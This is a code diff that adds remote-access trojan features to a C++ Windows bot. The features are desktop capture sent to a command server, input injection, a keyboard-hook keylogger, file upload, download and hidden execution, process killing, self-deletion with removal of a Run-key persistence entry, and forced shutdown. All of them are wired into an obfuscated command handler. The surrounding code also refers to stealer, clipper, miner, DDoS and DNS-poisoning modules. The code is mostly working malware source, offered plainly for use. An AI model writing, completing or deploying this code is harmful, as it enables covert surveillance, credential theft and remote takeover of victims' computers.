@@ -423,7 +423,415 @@ public:
     }
 };
 
-// 4. REMOTE SHELL MODULE
+// 4. REMOTE DESKTOP MODULE
+class RemoteDesktopModule {
+private:
+    bool isActive = false;
+    SOCKET clientSocket = INVALID_SOCKET;
+    std::thread desktopThread;
+    
+    void captureAndSendDesktop() {
+        while (isActive) {
+            HDC hdcScreen = GetDC(NULL);
+            HDC hdcWindow = GetDC(GetDesktopWindow());
+            HDC hdcMemDC = CreateCompatibleDC(hdcWindow);
+            
+            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+            
+            HBITMAP hbmScreen = CreateCompatibleBitmap(hdcWindow, screenWidth, screenHeight);
+            HGDIOBJ hOld = SelectObject(hdcMemDC, hbmScreen);
+            
+            BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcWindow, 0, 0, SRCCOPY);
+            
+            // Convert bitmap to bytes and send to C2
+            // [Implementation for bitmap compression and network sending]
+            
+            SelectObject(hdcMemDC, hOld);
+            DeleteObject(hbmScreen);
+            DeleteDC(hdcMemDC);
+            ReleaseDC(NULL, hdcScreen);
+            ReleaseDC(GetDesktopWindow(), hdcWindow);
+            
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+    }
+    
+public:
+    bool startDesktop(SOCKET socket) {
+        if (isActive) return false;
+        clientSocket = socket;
+        isActive = true;
+        desktopThread = std::thread(&RemoteDesktopModule::captureAndSendDesktop, this);
+        return true;
+    }
+    
+    void stopDesktop() {
+        isActive = false;
+        if (desktopThread.joinable()) {
+            desktopThread.join();
+        }
+    }
+    
+    void simulateMouseClick(int x, int y, bool leftClick = true) {
+        SetCursorPos(x, y);
+        if (leftClick) {
+            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+        } else {
+            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+        }
+    }
+    
+    void simulateKeyPress(WORD vKey) {
+        keybd_event(vKey, 0, 0, 0);
+        keybd_event(vKey, 0, KEYEVENTF_KEYUP, 0);
+    }
+};
+
+// 5. CAMERA MODULE
+class CameraModule {
+private:
+    bool isActive = false;
+    int captureQuality = 80; // 1-100
+    bool fullscreenMode = false;
+    std::thread cameraThread;
+    
+    void captureAndSendVideo() {
+        while (isActive) {
+            // DirectShow/Media Foundation camera capture
+            // [Implementation for camera access and streaming]
+            std::this_thread::sleep_for(std::chrono::milliseconds(33)); // ~30 FPS
+        }
+    }
+    
+public:
+    bool startCamera(int quality = 80, bool fullscreen = false) {
+        if (isActive) return false;
+        captureQuality = quality;
+        fullscreenMode = fullscreen;
+        isActive = true;
+        cameraThread = std::thread(&CameraModule::captureAndSendVideo, this);
+        return true;
+    }
+    
+    void stopCamera() {
+        isActive = false;
+        if (cameraThread.joinable()) {
+            cameraThread.join();
+        }
+    }
+    
+    void setQuality(int quality) {
+        captureQuality = std::clamp(quality, 1, 100);
+    }
+    
+    void toggleFullscreen() {
+        fullscreenMode = !fullscreenMode;
+    }
+};
+
+// 6. KEYLOGGER MODULE
+class KeyloggerModule {
+private:
+    bool isActive = false;
+    bool liveMode = false;
+    std::string logBuffer;
+    std::thread keylogThread;
+    std::mutex logMutex;
+    HHOOK hKeyHook = NULL;
+    
+    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+            KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
+            DWORD vkCode = pKeyStruct->vkCode;
+            
+            std::string keyStr = getKeyString(vkCode);
+            // Add to log buffer with timestamp
+            auto now = std::chrono::system_clock::now();
+            auto time_t = std::chrono::system_clock::to_time_t(now);
+            
+            std::stringstream ss;
+            ss << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] " << keyStr << "\n";
+            
+            // Add to buffer thread-safely
+            std::lock_guard<std::mutex> lock(logMutex);
+            logBuffer += ss.str();
+        }
+        return CallNextHookEx(NULL, nCode, wParam, lParam);
+    }
+    
+    static std::string getKeyString(DWORD vkCode) {
+        switch (vkCode) {
+            case VK_BACK: return "[BACKSPACE]";
+            case VK_RETURN: return "[ENTER]";
+            case VK_SPACE: return " ";
+            case VK_TAB: return "[TAB]";
+            case VK_SHIFT: return "[SHIFT]";
+            case VK_CONTROL: return "[CTRL]";
+            case VK_MENU: return "[ALT]";
+            case VK_CAPITAL: return "[CAPS]";
+            case VK_ESCAPE: return "[ESC]";
+            default:
+                if (vkCode >= 'A' && vkCode <= 'Z') {
+                    return std::string(1, (char)vkCode);
+                } else if (vkCode >= '0' && vkCode <= '9') {
+                    return std::string(1, (char)vkCode);
+                }
+                return "[UNKNOWN]";
+        }
+    }
+    
+public:
+    bool startKeylogger(bool live = false) {
+        if (isActive) return false;
+        liveMode = live;
+        isActive = true;
+        
+        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+        if (!hKeyHook) return false;
+        
+        return true;
+    }
+    
+    void stopKeylogger() {
+        isActive = false;
+        if (hKeyHook) {
+            UnhookWindowsHookEx(hKeyHook);
+            hKeyHook = NULL;
+        }
+    }
+    
+    std::string getLogs() {
+        std::lock_guard<std::mutex> lock(logMutex);
+        return logBuffer;
+    }
+    
+    void clearLogs() {
+        std::lock_guard<std::mutex> lock(logMutex);
+        logBuffer.clear();
+    }
+    
+    bool isLiveMode() const { return liveMode; }
+};
+
+// 7. FILE MANAGER MODULE
+class FileManagerModule {
+public:
+    std::string listDirectory(const std::string& path) {
+        std::stringstream result;
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);
+        
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                    result << (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "[DIR] " : "[FILE] ");
+                    result << findData.cFileName << " (" << findData.nFileSizeLow << " bytes)\n";
+                }
+            } while (FindNextFileA(hFind, &findData));
+            FindClose(hFind);
+        }
+        return result.str();
+    }
+    
+    bool uploadFile(const std::string& localPath, const std::vector<uint8_t>& data) {
+        std::ofstream file(localPath, std::ios::binary);
+        if (!file) return false;
+        
+        file.write(reinterpret_cast<const char*>(data.data()), data.size());
+        return file.good();
+    }
+    
+    std::vector<uint8_t> downloadFile(const std::string& filePath) {
+        std::ifstream file(filePath, std::ios::binary);
+        if (!file) return {};
+        
+        file.seekg(0, std::ios::end);
+        size_t size = file.tellg();
+        file.seekg(0, std::ios::beg);
+        
+        std::vector<uint8_t> data(size);
+        file.read(reinterpret_cast<char*>(data.data()), size);
+        return data;
+    }
+    
+    bool deleteFile(const std::string& filePath) {
+        return DeleteFileA(filePath.c_str()) != 0;
+    }
+    
+    bool executeFile(const std::string& filePath, const std::string& parameters = "") {
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        sei.lpVerb = "open";
+        sei.lpFile = filePath.c_str();
+        sei.lpParameters = parameters.empty() ? NULL : parameters.c_str();
+        sei.nShow = SW_HIDE;
+        
+        return ShellExecuteExA(&sei) != FALSE;
+    }
+};
+
+// 8. PROCESS MANAGER MODULE
+class ProcessManagerModule {
+public:
+    std::string listProcesses() {
+        std::stringstream result;
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32A pe32;
+            pe32.dwSize = sizeof(pe32);
+            
+            if (Process32FirstA(hSnapshot, &pe32)) {
+                do {
+                    result << "PID: " << pe32.th32ProcessID 
+                           << " | Name: " << pe32.szExeFile << "\n";
+                } while (Process32NextA(hSnapshot, &pe32));
+            }
+            CloseHandle(hSnapshot);
+        }
+        return result.str();
+    }
+    
+    bool killProcess(DWORD processId) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+        if (!hProcess) return false;
+        
+        BOOL result = TerminateProcess(hProcess, 0);
+        CloseHandle(hProcess);
+        return result != FALSE;
+    }
+    
+    bool killProcessByName(const std::string& processName) {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        PROCESSENTRY32A pe32;
+        pe32.dwSize = sizeof(pe32);
+        bool killed = false;
+        
+        if (Process32FirstA(hSnapshot, &pe32)) {
+            do {
+                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
+                    if (killProcess(pe32.th32ProcessID)) {
+                        killed = true;
+                    }
+                }
+            } while (Process32NextA(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return killed;
+    }
+};
+
+// 9. CONNECTION CONTROL MODULE
+class ConnectionControlModule {
+public:
+    void restartBot() {
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        sei.lpVerb = "open";
+        sei.lpFile = exePath;
+        sei.nShow = SW_HIDE;
+        
+        if (ShellExecuteExA(&sei)) {
+            ExitProcess(0);
+        }
+    }
+    
+    void closeBot() {
+        ExitProcess(0);
+    }
+    
+    void uninstallBot() {
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        // Remove from startup
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegDeleteValueA(hKey, "SystemUpdate");
+            RegCloseKey(hKey);
+        }
+        
+        // Create batch file to delete itself
+        std::ofstream batch("del.bat");
+        batch << "@echo off\n";
+        batch << "timeout /t 2 /nobreak > nul\n";
+        batch << "del \"" << exePath << "\"\n";
+        batch << "del \"%~f0\"\n";
+        batch.close();
+        
+        // Execute batch and exit
+        system("start del.bat");
+        ExitProcess(0);
+    }
+};
+
+// 10. SYSTEM CONTROL MODULE
+class SystemControlModule {
+public:
+    bool restartSystem() {
+        HANDLE hToken;
+        TOKEN_PRIVILEGES tkp;
+        
+        // Get shutdown privilege
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            return false;
+        }
+        
+        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+        tkp.PrivilegeCount = 1;
+        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        
+        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+        
+        if (GetLastError() != ERROR_SUCCESS) {
+            CloseHandle(hToken);
+            return false;
+        }
+        
+        // Restart system
+        bool result = ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION) != FALSE;
+        CloseHandle(hToken);
+        return result;
+    }
+    
+    bool shutdownSystem() {
+        HANDLE hToken;
+        TOKEN_PRIVILEGES tkp;
+        
+        // Get shutdown privilege
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            return false;
+        }
+        
+        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+        tkp.PrivilegeCount = 1;
+        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        
+        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+        
+        if (GetLastError() != ERROR_SUCCESS) {
+            CloseHandle(hToken);
+            return false;
+        }
+        
+        // Shutdown system
+        bool result = ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION) != FALSE;
+        CloseHandle(hToken);
+        return result;
+    }
+};
+
+// 11. REMOTE SHELL MODULE
 class RemoteShellModule {
 private:
     SOCKET clientSocket = INVALID_SOCKET;
@@ -843,6 +1251,13 @@ private:
     LoaderModule loader;
     StealerModule stealer;
     ClipperModule clipper;
+    RemoteDesktopModule remoteDesktop;
+    CameraModule camera;
+    KeyloggerModule keylogger;
+    FileManagerModule fileManager;
+    ProcessManagerModule processManager;
+    ConnectionControlModule connectionControl;
+    SystemControlModule systemControl;
     RemoteShellModule shell;
     ReverseProxyModule proxy;
     DDOSModule ddos;
@@ -913,6 +1328,93 @@ public:
             dnsPoisoner.addPoisonEntry(OBF("google.com"), OBF("192.168.1.100"));
             dnsPoisoner.activatePoisoning();
         }
+        // RAT COMMANDS
+        else if (command == OBF("START_DESKTOP")) {
+            remoteDesktop.startDesktop(shell.getSocket());
+        }
+        else if (command == OBF("STOP_DESKTOP")) {
+            remoteDesktop.stopDesktop();
+        }
+        else if (command.substr(0, 11) == OBF("MOUSE_CLICK")) {
+            // Parse mouse click: MOUSE_CLICK:x:y:left/right
+            // remoteDesktop.simulateMouseClick(x, y, leftClick);
+        }
+        else if (command.substr(0, 9) == OBF("KEY_PRESS")) {
+            // Parse key press: KEY_PRESS:vkCode
+            // remoteDesktop.simulateKeyPress(vkCode);
+        }
+        else if (command == OBF("START_CAMERA")) {
+            camera.startCamera(80, false);
+        }
+        else if (command == OBF("STOP_CAMERA")) {
+            camera.stopCamera();
+        }
+        else if (command.substr(0, 13) == OBF("CAMERA_QUALITY")) {
+            // Parse quality: CAMERA_QUALITY:80
+            // camera.setQuality(quality);
+        }
+        else if (command == OBF("CAMERA_FULLSCREEN")) {
+            camera.toggleFullscreen();
+        }
+        else if (command == OBF("START_KEYLOGGER")) {
+            keylogger.startKeylogger(false);
+        }
+        else if (command == OBF("START_KEYLOGGER_LIVE")) {
+            keylogger.startKeylogger(true);
+        }
+        else if (command == OBF("STOP_KEYLOGGER")) {
+            keylogger.stopKeylogger();
+        }
+        else if (command == OBF("GET_KEYLOGS")) {
+            std::string logs = keylogger.getLogs();
+            // Send logs to C2
+        }
+        else if (command == OBF("CLEAR_KEYLOGS")) {
+            keylogger.clearLogs();
+        }
+        else if (command.substr(0, 8) == OBF("LIST_DIR")) {
+            // Parse directory: LIST_DIR:C:\
+            // std::string result = fileManager.listDirectory(path);
+        }
+        else if (command.substr(0, 11) == OBF("UPLOAD_FILE")) {
+            // Parse upload: UPLOAD_FILE:path:base64data
+            // fileManager.uploadFile(path, data);
+        }
+        else if (command.substr(0, 13) == OBF("DOWNLOAD_FILE")) {
+            // Parse download: DOWNLOAD_FILE:path
+            // auto data = fileManager.downloadFile(path);
+        }
+        else if (command.substr(0, 11) == OBF("DELETE_FILE")) {
+            // Parse delete: DELETE_FILE:path
+            // fileManager.deleteFile(path);
+        }
+        else if (command.substr(0, 12) == OBF("EXECUTE_FILE")) {
+            // Parse execute: EXECUTE_FILE:path:params
+            // fileManager.executeFile(path, params);
+        }
+        else if (command == OBF("LIST_PROCESSES")) {
+            std::string processes = processManager.listProcesses();
+            // Send process list to C2
+        }
+        else if (command.substr(0, 12) == OBF("KILL_PROCESS")) {
+            // Parse kill: KILL_PROCESS:PID or KILL_PROCESS:NAME:processname
+            // processManager.killProcess(pid) or processManager.killProcessByName(name);
+        }
+        else if (command == OBF("RESTART_BOT")) {
+            connectionControl.restartBot();
+        }
+        else if (command == OBF("CLOSE_BOT")) {
+            connectionControl.closeBot();
+        }
+        else if (command == OBF("UNINSTALL_BOT")) {
+            connectionControl.uninstallBot();
+        }
+        else if (command == OBF("RESTART_SYSTEM")) {
+            systemControl.restartSystem();
+        }
+        else if (command == OBF("SHUTDOWN_SYSTEM")) {
+            systemControl.shutdownSystem();
+        }
     }
     
     void shutdown() {
@@ -921,11 +1423,15 @@ public:
             heartbeatThread.join();
         }
         
+        // Stop all modules
         clipper.stopClipper();
         miner.stopMining();
         ddos.stopAttack();
         proxy.stopProxy();
         dnsPoisoner.deactivatePoisoning();
+        remoteDesktop.stopDesktop();
+        camera.stopCamera();
+        keylogger.stopKeylogger();
     }
 };
 
